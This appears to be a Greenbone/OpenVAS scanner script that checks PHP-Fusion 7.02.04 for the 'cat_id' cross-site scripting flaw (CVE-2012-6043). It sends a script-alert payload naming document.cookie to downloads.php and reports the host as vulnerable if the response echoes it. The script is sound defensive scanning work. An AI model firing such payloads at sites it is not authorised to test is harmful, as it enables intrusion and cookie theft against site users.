CPE = "cpe:/a:php-fusion:php-fusion";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803221" );
	script_version( "2020-05-11T07:30:32+0000" );
	script_cve_id( "CVE-2012-6043" );
	script_bugtraq_id( 51365 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-11 07:30:32 +0000 (Mon, 11 May 2020)" );
	script_tag( name: "creation_date", value: "2013-02-01 10:26:58 +0530 (Fri, 01 Feb 2013)" );
	script_name( "PHP-Fusion 'cat-id' Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_php_fusion_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "php-fusion/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51365/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/108542/phpfusion70204-xss.txt" );
	script_tag( name: "insight", value: "The flaw is due to input passed via the 'cat_id' parameter to
  'downloads.php' is not properly sanitized before being it is returned to the user." );
	script_tag( name: "solution", value: "Apply the patch or upgrade to 7.02.05 or later." );
	script_tag( name: "summary", value: "This host is installed with PHP-Fusion and is prone cross-site
  scripting vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site when the malicious data is being viewed." );
	script_tag( name: "affected", value: "PHP-Fusion version 7.02.04" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/downloads.php?cat_id=\"<script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

